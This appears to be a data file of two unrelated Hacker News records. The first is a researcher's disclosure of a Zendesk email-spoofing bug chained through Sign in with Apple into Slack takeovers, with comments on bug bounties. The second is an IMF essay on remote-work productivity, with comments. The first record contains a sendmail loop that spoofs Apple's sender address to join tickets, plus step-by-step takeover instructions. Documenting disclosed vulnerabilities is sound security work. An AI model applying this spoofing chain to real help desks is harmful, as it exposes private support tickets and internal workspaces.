    "originBody": "hi, i'm daniel. i'm a 15-year-old with some programming experience and i do a little bug hunting in my free time. here's the insane story of how I found a single bug that affected over half of all Fortune 500 companies: say hello to zendesk If you've spent some time online, you’ve probably come across Zendesk. Zendesk is a customer service tool used by some of the world’s top companies. It’s easy to set up: you link it to your company’s support email (like support@company.com), and Zendesk starts managing incoming emails and creating tickets. You can handle these tickets yourself or have a support team do it for you. Zendesk is a billion-dollar company, trusted by big names like Cloudflare. Personally, I’ve always found it surprising that these massive companies, worth billions, rely on third-party tools like Zendesk instead of building their own in-house ticketing systems. your weakest link As the saying goes, “You’re only as strong as your weakest link.” Since Zendesk is just seen as a basic ticketing tool, companies often set it up without much thought. The most common setup I've seen is is forwarding all emails from support@company.com to Zendesk. Why is that dangerous? Many companies use their @company.com domain for Single Sign-On (SSO), which lets employees quickly log in to internal tools. By connecting Zendesk to the same domain, companies unknowingly create a potential security gap. Zendesk handles all emails for the domain it’s configured for, which means if your SSO system doesn’t properly validate email addresses, anyone who gains access to your Zendesk could potentially exploit this and access your internal systems. (I’ll explain more on this later.) email spoofing At the beginning of the year, I discovered a serious vulnerability in Zendesk that allowed attackers to read customer support tickets from any company using Zendesk. All they had to do was sent a crafted email to a Support email handled by Zendesk. The shocking part? Zendesk didn’t seem to care. The bug itself was surprisingly simple. Zendesk had no effective protection against email spoofing, and this oversight made it possible to exploit their email collaboration feature to gain access to others’ tickets. Here’s how it worked: When you send an email to a company’s Zendesk support portal (e.g., support@company.com), Zendesk creates a new support ticket. To keep track of the email thread, Zendesk automatically generates a reply-to address, which looks like this: support+id{id}@company.com, where {id} is the unique ticket number. This address ensures that any future replies you send go directly to the same ticket. Zendesk also has a feature for ticket collaboration. If you CC someone on one of your email replies, Zendesk automatically adds them to the ticket, allowing them to see the full ticket history in the support portal. The exploit was simple: if an attacker knew the support email address and the ticket ID (which are usually easy to guess since ticket IDs are incremental), they could use email spoofing to impersonate the original sender. By sending a fake email to support+id{id}@company.com from the requestor’s email address and CCing their own email, Zendesk would think the email was legitimate. It would then add the attacker’s email to the ticket, giving them full access to the entire ticket history. This meant an attacker could effectively join any ongoing support conversation, and read sensitive information—all because Zendesk didn’t have proper safeguards against email spoofing. Bug Prerequisites: Requestor's email The ticket ID (since Zendesk ticket IDs are incremental, an attacker could brute-force or estimate it) Access to a public support portal \"out of scope,\" said no attacker ever As soon as I discovered this vulnerability, I reported it through Zendesk’s bug bounty program, fully expecting it to be taken seriously and fixed quickly. A week later, I was hit with a disappointing response: Because my bug relied on email spoofing, which was considered \"out of scope\" for their HackerOne program, they rejected my report. It was unbelievable. This response wasn’t even from an actual Zendesk team member. Many companies, like Zendesk, use a HackerOne service to triage reports so their own team can focus on fixing bugs instead of verifying submissions. Realizing this, I asked for the report to be forwarded to an actual Zendesk staff member for review. A few days later, I got another frustrating reply: Zendesk refused to reconsider. Despite the security risk, they wouldn’t act on the report because it fell outside their program’s scope. Of course, they’d change their minds in a few weeks—but more on that later. escalating this to a full Slack takeover I could have reported the email spoofing bug to individual companies that were affected by it, as it was possible to patch individual instances by disabling email collaboration, prevent attackers from adding themselves to tickets. But I wanted to make a bigger impact. That's when I came across TICKETTRICK, a blog post from 2017. In it, security researcher Inti De Ceukelaire detailed how he exploited Zendesk to infiltrate the private Slack workspaces of hundreds of companies. Since many companies use Slack SSO on the same domain as Zendesk, the researcher figured out he could complete email verifications through a support@company.com email, and gain access to private Slack channels. Back then, Zendesk wasn't as big and there were some bugs that allowed anyone to view your tickets if they had your email. I realized that I could replicate his exploit using my bug, but with a few challenges to overcome. Enter OAuth After his disclosure (this was years ago!), Slack changed their email verification system to include a random token in email addresses. Inti's exploit (like mine) required the attacker to know the sending email address of the verification code. Slack added random tokens to their email addresses to combat similar attacks in the future. It was impossible to know what email they would send the verification email from (which is one of the prerequisites required for my exploit) as they generated a random token everytime. Unless... While Slack used a random email token when sending email verification, neither Google or Apple did. Slack supported both methods for OAuth login. It was the most simple bypass. Slack intoduced OAuth login just a few years ago and must have completely forgotten about their protections against this type of attacks. So now the exploit was simple, create a Google account with a support@company.com email, request verification code, use my bug to access the ticket Zendesk automatically creates when it arrives, verify Google account, login with Google to Slack. This was perfect...except it wouldn't work with Google. Google sent verification email from noreply@google.com and Zendesk had started blocking emails from noreply@ addresses from being automatically created as tickets (probably after the TICKETTRICK disclosure too) which meant we wouldn't be able to recieve it. Apple didn't do this though, Apple sent verification emails from appleid@ address, jackpot. reproduction steps, apple -> zendesk -> slack The steps to execute the attack now were simple: Create an Apple account with support@company.com email and request a verification code, Apple sends verification code from appleid@id.apple.com to support@company.com and Zendesk automatically creates a ticket At the same time, create a ticket on company.com support portal from my own email address, this allows me to keep track of a ID range Use the email spoofing bug I mentioned earlier to attempt to add yourself to every ticket within the range from earlier const sendmail = require('sendmail')(); // Assuming the ticket you created in step #2 was assigned a ticket ID of #453 // verification email landed somewhere near there const range = [448, 457]; for (let i = range[0]; i < range[1]; i++) { // Send spoofed emails from Apple to Zendesk sendmail({ from: 'appleid@id.apple.com', to: `support+id${i}@company.com`, cc: 'daniel@wearehackerone.com', subject: '', html: 'comment body', }, function (err, reply) { console.log(err && err.stack) console.dir(reply) }); }; Login to a company.com support portal (usually at support.company.com) from your account (daniel@wearehackerone.com) and view your CCed tickets. Enter the verification code in Apple Use Slack's \"Login with Apple\" feature and log in with the Apple account connected to company.com's email I replicated this 6-step reproduction steps across hundreds of vulnerable Zendesk and Slack instances. After getting everything ready, I started individually reporting the bug to companies using Zendesk. aftermath I spent about a week reporting the vulnerability to individual companies, some of them took immediate action and patched their instances, while others argued that it was a Zendesk issue. Then, something interesting happened—a comment appeared on my original HackerOne report: I couldn’t help but find it amusing—they were now asking me to keep the report confidential, despite having initially dismissed it as out of scope. Some companies must have contacted Zendesk after recieving my report and the pressure from this issue had essentially forced Zendesk’s hand. I hadn’t mentioned the Slack exploit in my original report to them because I hadn’t discovered it at that point, now they wanted full detailed reproduction steps for the Slack takeover. I provided the proof of concept for the Slack vulnerability, and they confirmed the issue. Though they claimed they had \"started working\" on a fix, it would actually take them over two months to resolve it. bounties Once companies vulnerable to this were alerted to the issue, many of them quickly disabled Zendesk’s email collaboration feature to protect their instances. Over the course of my reporting, I earned more than $50,000 in bounties from individual companies on HackerOne and other platforms. Unsurprisingly, Zendesk didn’t come out of this looking good. At least one or two companies reportedly cut ties with Zendesk after my disclosure, canceling their agreements altogether. zendesk's fix (and my $0 bounty) On July 2, 2024—two months after I submitted the report—Zendesk finally confirmed that they had fixed the issue. Here’s a statement from their Offensive Security Leader: In most cases, when an end user submits a support request by email, the email becomes a new ticket or adds a comment to an existing ticket. However, in certain cases, the email may be suspended. Suspending an email means putting it aside for further review. It's not necessarily spam. It's just not a ticket in Zendesk Support yet. It remains in limbo until somebody reviews it and decides whether to accept or reject it. We use two spam filters, Cloudmark and Rspamd EAP to help determine suspicious characteristics in messages. Depending on the score received by these tools, messages may be suspended. If you are curious, we publish a full list of causes for ticket suspension. In the attack scenario explained here, Cloudmark had very low spam scores of while RSpamD had very high spam scores; unfortunately we weren’t using the RSpamD score in this case, otherwise many of the emails would have been suspended and limited the ability to add CCs at all. The first fix we implemented was to Automatically switch to RSPAMD spam analysis when: Our automatic ticket threading is triggered to thread an new email into a existing ticket and; We haven’t previously suspended the message due to the Cloudmark score. In addition to this, we also implemented filters to automatically suspend the following classes of emails: User verification emails sent by Apple based on the Reply-To and Message-Id header values Non-transactional emails from from googleworkspace-noreply@google.com Over the coming months, we will continue to look into opportunities to strengthen our Sender Authentication functionality and provide customers with more gradual and advanced security controls over the types of emails that get suspended or rejected. Despite fixing the issue, Zendesk ultimately chose not to award a bounty for my report. Their reasoning? I had broken HackerOne's disclosure guidelines by sharing the vulnerability with affected companies. I didn’t bother to argue :) conclusion What started as a small email bug turned into an exploit that allowed me to infiltrate the internal systems of some of the world’s largest companies. While Zendesk eventually fixed the vulnerability, the journey to get there was a frustrating mix of rejections, slow responses, and ultimately no recognition for the report.

Bug bounties are taken seriously by at least some companies. Where I have worked, we received very useful reports, some very severe, via HackerOne. The company even ran special sessions where engineers and hackers were brought together to try to maximize the number of bugs found in a few week period. It resulted in more secure software at the end and a community of excited researchers trying to make some money and fame on our behalf. The root cause in this case seems to be that they couldn’t get by HackerOne’s triage process because Zendesk excluded email from being in scope. This seems more like incompetence than malice on both of their parts. Good that the researcher showed how foolish they were. reply dgoldstein0 1 hour agorootparentThis feels like a case in the gray area. On the one hand, companies need to declare certain stuff out of scope - whether they know about it and are planning to work on it, or consider it acceptable risk, as the point for the company is to help them improve their security posture within the scope of the resources they have to run the bug bounty program. What's weird here is that the blog author found an email problem that wasn't really in that DKIM/SPF etc area, and Zendesk claimed that exemption covered it. Without a broader PoC to show how it could be weaponized, it's hard to say that Zendesk was egregiously wrong here - the person triaging just lacked the imagination to figure out that it would be a real problem. Hell, later in the write up we learn Zendesk does do spam filtering on the inbound emails, and so it's not crazy to think a security engineer reading the report may assume that stuff would cover their butts, when it failed miserably here. (A good Engineer would check that assumption though) That said putting my security hat on, I have to ask - who thought that sequential ticket ids in the reply-to email address were a good idea? they really ought to be using long random nonces; at which point the \"guess the right id to become part of the support thread\" falls apart. Classic enumeration+IDOR. So it sounds like there's still a potential for abuse here, if you can sneak stuff by their filters. reply mmsc 4 minutes agorootparent>Without a broader PoC to show how it could be weaponized, it's hard to say that Zendesk was egregiously wrong here The implications of being able to read arbitrary email contents from arbitrary domains' support (or otherwise) addresses are well known, and any competent security personnel in ZenDesk's security team should know this is exactly what can happen. Something similar has been discussed on HN before: https://news.ycombinator.com/item?id=38720544 but the overall attack vector of \"get registration email send to somewhere an attacker can view it\" is not novel at all; it's also how some police database websites have been popped in the past (register as @fbi.gov which automatically gives you access; somehow access the inbox of @fbi.gov due to some public forwarding, for example) reply Thorrez 19 minutes agorootparentprev>Without a broader PoC to show how it could be weaponized, it's hard to say that Zendesk was egregiously wrong here There was a PoC of how to view someone else's ticket (assuming you know the other person's email and approximately when the ticket was filed). >it's not crazy to think a security engineer reading the report may assume that stuff would cover their butts It sounds like they got a report saying \"I can spoof an email and view someone else's report\". Why would they assume the spam protection would protect them when they have a report saying it's not protecting them? reply j0hnyl 3 hours agorootparentprevIt's incredibly hard and resource intensive to run a bounty program, so anyone doing it for shortcuts or virtue signaling will quickly realize if they're not mature enough to run one. reply wil421 1 hour agorootparentprev“2) seen as a cheaper alternative to someone who knows anything about security - \"why hire someone that actually knows anything about security when we can just pay a pittance to strangers and believe every word they say?\"” It doesn’t make sense, companies with less revenue aren’t the ones doing this.

I doubt we were the first. That is presumably the reason they failed to pay out. The real issue is that non-directory SSO options like Sign in with Apple (SIWA) have been incorrectly implemented almost everywhere, including by Slack and other large companies we alerted in June. Non-directory SSO should not have equal trust vs. directory SSO. If you have a Google account and use Google SSO, Google can attest that you control that account. Same with Okta and Okta SSO. SIWA, GitHub Auth, etc are not doing this. They rely on a weaker proof, usually just control of email at a single point in time. SSO providers are not fungible, even if the email address is the same. You need to take this into account when designing your trust model. Most services do not. reply harrisonjackson 3 hours agoparentAh, that makes a lot of sense. This is a foot gun that you can run into even with an auth provider like Auth0 or Clerk let alone rolling your own.

Also the bit about SPF, DKIM and DMARC seems to show a misunderstanding of the issue: these are typically excluded because large companies aren't able to do full enforcement on their email domains due to legacy. It's a common bug report. In this case, the problem was that Zendesk wasn't validating emails from external systems. reply nightpool 8 minutes agorootparentIn this case, that probably means that H1 had a Zoom or Slack convo with the team and is relaying their decision into text instead of making them write it down themselves. reply richbell 4 hours agorootparentprev> If I am not mistaken, it wasn't zendesk that didn't want to recognize the bug, but HackerOne that did not escalate to Zendesk that they should reconsider the exclusion ground in this case.

Though his pondering of 'why do companies use third party support systems instead of rolling their own' gave his age away :) reply twoodfin 4 hours agoprevSlack seems to be getting off too easy here. The security—as implemented by Fortune 500 customers??—of an org-wide security domain (i.e. what everyone in an org can see) depends on whether any of the supported OAuth providers can be tricked into provisioning an account with @targetorg.com? This architecture makes 0 sense to me. Even if an org has totally outsourced its identity and auth management to Google (is this possible?), presumably that would include controls over how new @targetorg.com identities are created on the Google end. No F500 companies are using Apple as an identity provider since they definitely don't sell such services. So why would an F500 company configure Slack to allow Apple OAuth & introduce this vulnerability? reply kbolino 2 hours agoparentIf you're using Google for identity and authentication, you can definitely control who has an active account in your domain. There can be some lag time before disabling or removing someone truly disables all their downstream accesses, but that's largely outside Google's control. The only way to trick your way into getting a corporate domain email address is to socially engineer a domain admin. Tangentially, this does raise one of my big issues with using OAuth2 for single-sign-on though, which is that it really doesn't address the third-party authorization problem well. Ok, you're bob@example.com, Google has verified that, and example.com is our domain, so we're letting you into our app Foobar. Now what? The scopes you requested were for Google APIs only and have nothing to do with Foobar really. So now we need to implement an authorization system in Foobar that decides what bob@example.com can actually do. This part, and how to do it right, gets glossed over (at best!) by discussions on OAuth2. It also gets glossed over by product and security when they want things \"SSO-enabled\", which means development time doesn't get budgeted for it. Even just using groups to control coarse access levels requires integration with provider-specific APIs. OAuth2 is great for identity and authentication, but far too little attention has been paid to doing authorization right. reply autarch 2 hours agoparentprevI'm pretty sure you can configure your corporate Slack to only allow authentication providers you choose. So if you have a corporate SSO you can just allow that. reply tryauuum 4 hours agoparentprevI'm not sure (maybe it's the case only with email auth, not oauth). But there's a setting on slack to not automatically allow people with your company email address. So the tools are there to stop the attack reply gavingmiller 4 hours agoprevThe piece the author is missing, and why zendesk likely ignored this is impact, and it's something I continually see submissions lacking. As a researcher, if you can't demonstrate impact of your vulnerability, then it looks like just another bug. A public program like zendesk is going to be swamped with reports, and they're using hackerone triagers to augment that volume. The triage system reads through a lot of reports - without clear impact, lots of vulnerabilities look like \"just another bug\". Notice that Zendesk took notice once mondev was able to escalate to an ATO[1]. That's impact, and that gets noticed!

I personally find it a waste of time to sink evenings into an exploit when they're going to fix the bug anyway if I simply tell them about the problem. They also know the system better than I do and can probably find a bigger impact anyway Of course, this is only a good strategy if you're just wanting to do a good deed and not counting on getting more than a thank you note, but Zendesk or Hackerone (whoever you want to blame here) didn't even accept the bug in the first place. That's the problem here, not the omission of an exploit chain reply patcon 4 hours agoparentprevYes. But respectfully (residual frustration at zendesk might make me curt here) if their security triage team can't see how dangerous it is for an attacker to get access to an arbitrary thread on a their CLIENT's corporate email chains (in this world of email logins and SSO), then they have a big lapse in security culture, no? Yes, the researcher could have tee'd himself up better, but this says way more about zendesk than it does about the 15-year-old researcher. reply ec109685 1 hour agoparentprevThe researcher showed how they could hop onto any Zendesk support ticket thread with zero authentication, so that should have been enough given Zendesk was exposing customer data via that attack path. Clearly Zendesk needs to change things so that the email address that is created for a ticket isn’t guessable. reply XCabbage 18 minutes agoparentprevUnauthorized read access to private emails you were never legitimately CCed on already is impact.

Zendesk deserve a lot of flack here, especially after they already realized this is real. However, just to empathize a bit: the amount of spam SPF, DKIM, DMARC \"security\" reports anyone running a service gets is absolutely insane.

Alternatively making a non-guessable id for the email. reply vitus 3 hours agoparentHey, now you have to bypass two spam filters, and also email verification from Apple is now marked as likely-spam.

Otherwise, why would you need the Cc hack? reply nodamage 39 minutes agorootparentThe email sender needs to be spoofed in order to add the CC. 1. Apple sends a legitimate email with a verification code from appleid@id.apple.com to support@company.com, creating a ticket in Zendesk. 2.

    "originBody": "English العربية español français 日本語 русский 中文 Download PDF A fivefold increase in remote work since the pandemic could boost economic growth and bring wider benefits Economics is famous for being the dismal science. Sadly, recent work highlighting the slowdown in productivity growth stretching back to the 1950s is no exception. But I take a more cheerful view because of the great productivity gains promised by the pandemic-induced jump in working from home. Working from home (WFH) increased about tenfold following the outbreak of the pandemic and has settled in at about five times its prepandemic level (see Chart 1). This could counter slowing productivity and deliver a surge in economic growth over the next few decades. If AI yields additional output, the era of slow growth could be over. The decomposition of economic growth by Nobel laureate Robert Solow, one of the most famous economists of all time, guides my analysis. Solow’s 1957 classic paper highlights how growth comes from both the increase in factor inputs like labor and capital and from raw productivity growth. I hang my analysis on his framework by highlighting in turn how each of these factors will promote faster growth. Labor The easiest way to see labor’s impact is the survey evidence from across the United States, Europe, and Asia that shows hybrid work is worth about an 8 percent increase in salary. Hybrid work is the typical pattern for office workers, managers, and other professionals, involving usually two or three days a week away from the office. To understand why employees would consider this to be worth 8 percent of their salary, note that typical workers spend about 45 hours a week in the office, yet they spend close to another 8 hours a week commuting. So working from home three days a week saves them about five hours a week, about 10 percent of their total weekly work and commute time. Most people really dislike commuting, and so place even greater value on this time savings. See, for example, another famous paper, by the Nobel Prize winner Daniel Kahneman. This research found that commuting is the most detested activity in the day, disliked even more than work itself. This makes it easy to understand why the average employee values working from home so much—with its ability to save hours of painful weekly commuting, alongside the flexibility of being able to live farther from work. This value of working from home has a powerful impact on labor supply. In the global economy there are tens of millions of people who are on the edge of the workforce. So small changes in the attractiveness of work can bring many millions of them into employment. This marginal labor force includes those with childcare or eldercare responsibilities, those close to retirement, and some folks in rural areas. One example of this WFH impact on labor supply is the approximately 2 million more employees with a disability who are working in the US following the pandemic. These increases in disability employment have occurred primarily in high-WFH occupations. Employees with a disability benefit in two ways: first, by avoiding long commutes and second, by the ability to control their work environment at home. Another example is prime-age female employment in the US, which has risen about 2 percent faster than prime-age male employment since the pandemic. Women’s larger role in childcare could be driving this rise in female labor force participation via WFH, according to recent research. Collectively these effects could increase labor supply by several percent. Of course, this calculation takes the current population as given. In the longer run, WFH could also increase fertility rates. One story I’ve heard repeatedly from talking to hundreds of employees and managers is how working remotely makes it easier to parent. This is perhaps most salient in East Asia, where long workdays, punishing commutes, and intense parenting pressures have led to rapidly dropping fertility. If parents are able to work two or three days a week at home, particularly with flexible schedules that allow them to share parenting responsibilities, this could increase birth rates. Preliminary analysis based on US survey data suggests perhaps 0.3 to 0.5 more desired children per couple when both work from home one day or more a week. Capital The beneficial impact of WFH on capital comes from the longer-term release of office space for other uses, like residential and retail. If employees are based at home two or three days a week, society needs less office space, and that space can be used for other activities. It also reduces commuting traffic, curbing the need for additional transportation infrastructure. More intensive use of our home capital—the space and equipment in our houses and apartments—can allow society to save on the use of transportation and office capital, which can be redeployed to other uses. In major city centers about half of the land is covered in office space, and given that office occupancy is now 50 percent below prepandemic levels, there is great potential for office space reduction. Recent data on driving speeds show that traffic is now moving about 2 or 3 miles per hour faster during the morning commute, which reduces the need for additional transportation infrastructure and saves the typical commuter a few minutes a day. Over the longer term, allowing employees to work partially or fully remotely also opens up currently underused land for housing, effectively increasing the usable land supply. Many major cities are heavily congested because most employees do not want to live more than a one-hour commute from the center. If they are required at work only a couple of days a week, longer commutes become possible, opening up space farther outside city centers for housing use. Collectively, these capital contributions could also raise output a few percent over the coming decades. Productivity Classic firm and individual micro studies typically find that hybrid work, the usual pattern for about 30 percent of the US, European, and Asian labor forces, has a roughly flat impact on productivity. WFH benefits workers by saving them from exhausting commutes and typically provides a quieter working environment. But by reducing time at the office, it can also reduce employees’ ability to learn, to innovate, and to communicate. These positive and negative effects roughly offset each other, generating no net productivity impact of hybrid WFH, research suggests. The impact of fully remote working, which has been adopted by about 10 percent of employees, is highly dependent on how well it’s managed. Some studies that examined fully remote working during the early days of the pandemic found large negative impacts, potentially because of the chaos of the early lockdowns. Other studies found large positive impacts, typically in more self-directed activities, such as call center or data entry work with well-managed firms. In summary, the impact of fully remote work is perhaps neutral, because firms tend to adopt it only when such work arrangements match the work activity—often tasks such as coding or IT support, carried out by trained employees in a managed environment. But while the micro productivity impacts on any individual firm may be neutral, the huge power of labor market inclusion means that the aggregate macro impact is likely to be positive. To explain the benefits of labor market inclusion, consider that fully in-person jobs can be filled only by nearby employees. A human resources or information technology position in New York can, for example, be filled only by a local resident. Even if there are people in Bulgaria, Brazil, or Belize who would be a better fit, they cannot do the job if they are not there in person. But as soon as positions can be filled remotely, employers go from taking the best local employee to taking the best regional employee for hybrid and the best global employee for fully remote work. Recent studies of work discrimination and reallocation highlight how expanding labor markets to a wider pool of potential employees can have massive productivity benefits. Going from 10 to 10,000 qualified candidates for a position allows a far more productive match, particularly if AI can help screen applicants. Remote work enables global matching between employees and firms, boosting labor productivity. An additional macro productivity benefit from working from home is its positive impact on pollution from transportation. The WFH surge has curbed commuting traffic volumes across the US and Europe by an estimated 10 percent. This has reduced pollution, particularly emissions of low-level heavy particulates. Health studies have linked pollution to cognitive and productivity damage. Lowering pollution not only improves our quality of life but can also increase growth. Positive feedback loop A positive feedback loop—from working from home to faster growth and back—boosts these impacts. A long history of market-size effects in economics highlights how firms strive to innovate to serve larger, more lucrative markets. When you go from 5 million to 50 million people working from home every day, major hardware and software companies, start-ups, and funders take notice. This leads to an acceleration of new technologies to serve those markets, improving their productivity and growth. That feedback loop has already begun. The share of new patent applications at the US Patent and Trademark Office that repeatedly use “remote work,” “working from home,” or similar words was flat until 2020 but has started to rise (see Chart 2). This highlights the improvement in technologies. Better cameras, screens, and software and technologies such as augmented and virtual reality and holograms will increase the productivity of hybrid and remote work in the future. This will generate a positive feedback loop between growth and working from home. One critique of the boom in working from home is the damage to city centers. It’s true that retail spending has fallen in city centers, but this activity has relocated to the suburbs, and overall consumption expenditure has resumed its prepandemic trend. Perhaps more problematic is the large reduction in valuations of commercial office space. Although this represents a loss of valuation for investors in the office sector, the release of city center space for residential use will in the long run make downtown living more affordable. The cost of living in the city rose dramatically in the 1990s and 2000s, pricing many middle- and lower-income employees out of city centers. This is especially problematic as many of these workers provide essential services, such as firefighting, policing, teaching, health care, food, transportation, and other work that can only be done in person. Cutting the amount of space for office use in city centers and converting it to residential use would make housing more affordable for these essential workers. The 2020 surge in working from home has helped offset the prepandemic productivity slowdown overall and is boosting present and future growth. Being an economist usually means balancing winners and losers. Analyzing changes in technology, trade, prices, and regulations usually has mixed effects, with large groups of winners and losers. When it comes to working from home, the winners massively outweigh the losers. Firms, employees, and society in general have all reaped huge benefits. In my lifetime as an economist I have never seen a change that is so broadly beneficial. This leaves me in the unusual place of being an optimistic “dismal scientist.” But it’s a place I’m happy to be as I write this while working from home. Podcast Working from home was not an option for most people before March 11, 2020, when work and home life suddenly collided. Stanford University's Nicholas Bloom was studying the potential impact of remote work long before the pandemic launched it into the mainstream and now has data to suggest businesses should stick to the hybrid working model.

    "commentBody": "Working from home is powering productivity (imf.org)544 points by rwmj 22 hours agohidepastfavorite404 comments jandrewrogers 13 hours agoI think a lot of people are talking past each other. I’ve mostly WFH since long before the pandemic, in many different capacities at many companies. A lot of people have tunnel vision and the reality is more nuanced than most allow. For IC work that requires minimal collaboration, WFH is often more productive. Fewer interruptions, more focus. However, when the role requires detailed collaboration and regular interaction with others, productivity for WFH falls off a cliff. This has been measurable at every company I’ve worked for that does a decent job of collecting these metrics. And anecdotally, I can feel it in my own job. When I am doing focus work, WFH is great and I get a lot done. When I need a lot of whiteboard time or deep discussions with my peers, WFH is very inefficient regardless of the remote setup, and the difference is so stark that it is difficult to argue. I think most people are talking their own book. If you are an IC or mostly just do individual focus work, then of course WFH is great. If you need to iteratively collaborate with people on complex design problems or work products, WFH objectively has low efficiency in every organization I’ve seen try it, including companies that are remote-centric. There is a lot of motivated reasoning in these discussions and little acknowledgement that productivity between WFH and RTO varies greatly depending on the task at hand. Every company and most roles are a mix of these types of tasks. I think many companies these days recognize this and try to allocate accordingly, but it creates legal, social, and other issues if you treat employees differently in this regard based on the nature of their roles. The reality that some people must commute to do their jobs effectively creates a class system of sorts but organizations needs all roles to be setup to ensure reasonable productivity. This is not a black and white situation, it is a complex social problem. reply steveBK123 5 hours agoparentAgreed its not black&white, but theres more factors than IC. For example I think all new grads need to be house trained with some in-office period, as well as have made enough money/been subsidized to actually have a proper WFH setup. 22 year olds hunched over a 14\" laptop screen on their nightstand ain't it. For people who've done 10/15/20 years in office, we know how to manage our time remotely, and many of us have long had proper home office setups for weekends/after hours. Further - many of us have long worked on globally distributed teams, so the concept of everyone getting around a whiteboard was literally never ever a thing. COVID, remote, hybrid, etc have brought a whole new way of working and tools such that I can collaborate with my global teams in ways we never did 2019&before. It also means that even in-office, people are spending hours on zoom.. which seems counterproductive. Anyway what we are really seeing is companies getting greedy. If you want to mandate in office days & hours, then maybe I don't need to check my email/slack first thing in morning, right before bed, and over the weekend. Maybe if I'm not allowed to work remotely, then I can't help with your urgent issues at 10pm or Sunday afternoon, etc. reply mattpallissard 4 hours agorootparentI always tell my friends and colleagues new to remote work that remote, async collaboration is a skill to be learned. You have to take a thought and distill it down to a diagram or written word before you share it. Personally, If I can't do that it tells me that my idea is still half baked. It also teaches you to avoid throwing out incomplete ideas or asking simple questions you could answer yourself as the rtt for a response in a distributed team is too high. reply steveBK123 4 hours agorootparentYes, and some see this as a plus / others as a minus. For juniors, there is some learning done by being extremely annoying constant question askers of their seniors. The good ones find a balance of actually trying things & collecting their thoughts before doing so.. more quickly than others. They can often be steered in this direction if you ask the same set of questions until they internalize the checklist themselves of how you tackle a problem before bothering others. Often, sitting in an on open floorplan with too high a concentration of juniors is essentially productivity killing to the point of lopping 20 IQ points off. reply linotype 3 hours agorootparentPart of the job as a senior+ is training entry/mid-level software engineers. Their job, at least part of it, is to ask questions and learn. reply steveBK123 2 hours agorootparentAgreed, however some teams/orgs have skewed ratios such that the senior job basically becomes fielding interrupts all day and then coding at home after dinner. Fine if thats the job, but don't call it senior engineer and treat as an IC role that is also expected to clear lots of Jiras (hey! seniors should be able to do 3X story points if juniors are doing X.. what are we paying them for!). A lot of \"flat organizations\" delude themselves with 30:1 IC:manager ratios where what's really happening under the hood is - 5 seniors on the team each fielding 5 juniors worth of interrupts all day, with 1 manager on top whack-a-moling crisis management. reply zeroonetwothree 3 hours agorootparentprevI’m 40+ and I still just work on my laptop. I do have an office setup but I dunno I just kind of like sitting in bed with the laptop. reply vbezhenar 11 hours agoparentprevIt might be efficient to work 60 hours week. Doesn't mean we should agree to it. Remote work improves quality of life. I don't care about company KPI or efficiency, I care about my own well-being first and foremost, as long as I have a choice. Companies should adapt and if it means that their efficiency will decrease, so be it. reply CalRobert 11 hours agorootparentUnfortunately this can be a race to the bottom as companies with wfh are driven out of business by those without reply codexjourneys 6 hours agorootparentThis will be counterbalanced by the fact that WFH is better for many employees from a work-life balance perspective, so higher-performing employees who have more choices will tend to gravitate toward companies that allow WFH. I expect many companies will arrive at an equilibrium with at least 2 days WFH for focused work and 3 days in-office for collaboration. This seems to already be happening since the % of companies offering hybrid is up this year. The question is how many great employees laggard companies will lose before accepting that. (Caveat: this does not apply to companies doing mostly ground-breaking work that have more mission-focused, highly qualified applicants than they can handle. Some companies may be surprised to find they are no longer in this bucket.) reply zanybear 2 hours agorootparentUnfortunately, once you go one way the 2 days are no longer of focus work. Not all people schedule the same type of work at the same time . reply steveBK123 5 hours agorootparentprevOr the opposite - companies with the most draconian and rigid RTO mandates end up with high attrition. Anyone who can work anywhere else does so, and the company becomes a collection of misfits over time. Currently the hard-RTO companies in the news are clearly doing it for silent layoffs reasons as there are simultaneous leaks of 5-figure attrition targets. Maybe a strong FTC/DOJ stance on antitrust, plus the top-down mandates will lead to more small company innovation as well. reply LaserToy 4 hours agorootparentCompanies need to make money. High performers will go to companies that make tons of money, even if relo to Sahara is needed reply steveBK123 4 hours agorootparentSure but it's often a cycle right, the high performers go to innovative companies that create lots of money. The companies that make lots of money then end up being softer & more extravagant with their employee (ahem, GOOG and a lot of Mag7/FAANG) until some equilibrium point where they're so soft they lose their edge. Then a new up&comer rises and the cycle repeats. reply ajuc 7 hours agorootparentprev> Unfortunately this can be a race to the bottom This works as an argument against 8h work day and 5-day work week too. Ultimately if something is better for the society (and WFH obviously is - commute time, carbon footprint, land prices, housing crisis - it helps with almost everything) - we should just force companies to use it by regulation, so that there's no \"race\" in that regard cause the conditions are the same for everybody. The exact regulation is tricky, but sth in the spirit of \"if your job can be WFH you should have an option of WFH\" is a good starting point. reply abustamam 4 hours agorootparentI agree that WFH is better for society, but anecdotally, it probably caused more of a housing crisis here in CA. Folks took their bay area salaries and moved to cheaper suburbs and totally wrecked the RE market. And I have read stories of similar things happening in other places that techies flocked to, like Austin, though I don't think it's necessarily fair to blame that on remote work because there were other factors in play there (politics for example) reply ajuc 4 hours agorootparent> Folks took their bay area salaries and moved to cheaper suburbs and totally wrecked the RE market. Isn't that what we want? Land prices averaging out? Then we can build where it's cheaper so more people have homes (with access to good jobs). It probably won't be limited to suburbs, if you can WFH from the same state - you can WFH from another state. reply rescbr 1 hour agorootparentLand prices averaged up, but local salaries aren’t doing the same. reply zeroonetwothree 3 hours agorootparentprevAnd many high performing companies famously expect employees to work more than 8h/day and/or weekends. reply ajuc 1 hour agorootparentSome people steal, does not mean stealing is fine or that we shouldn't ban it. reply Roark66 11 hours agorootparentprevShow me one example of this. reply CalRobert 10 hours agorootparentI was just referencing ops statement about how wfh is better even if it’s less efficient. I love wfh. I miss it. reply akoboldfrying 8 hours agorootparentprevWhy do you think bosses overwhelmingly want RTO? I think they want it because they fear productivity losses that mean lower profits, and ultimately lead to the threat of becoming uncompetitive. If you agree with that, is your position that these fears are irrational (because in your view, no such productivity loss would occur)? reply chasd00 5 hours agorootparentBosses want rto because they’re paying rent for empty office space. I’ve been wfh for a decade in the consulting business, only time I’m not wfh is meeting a client. My teams are distributed across the world and our stock price says wfh is fine. Bosses want rto because they can’t stand paying rent for empty space. reply akoboldfrying 4 hours agorootparentYou may be right that a big part of it is the psychological weight of that sunk cost. But if that were the only reason, there would be an easy win-win: Rent less office space and let people WFH. reply shinryuu 8 hours agorootparentprevAt the same time if they get worse talent because of it they could get lower productivity because of it reply akoboldfrying 6 hours agorootparentAgreed. So I think the question is: Which effect dominates? Both effects depend greatly on whether most other employers in the industry agree amongst themselves on whether to allow WFH: If everyone allows WFH, or everyone forbids it, there's no incentive to change employers, so these are stable equilibria, all other things being equal. Employers prefer the no-WFH equilibrium since (they 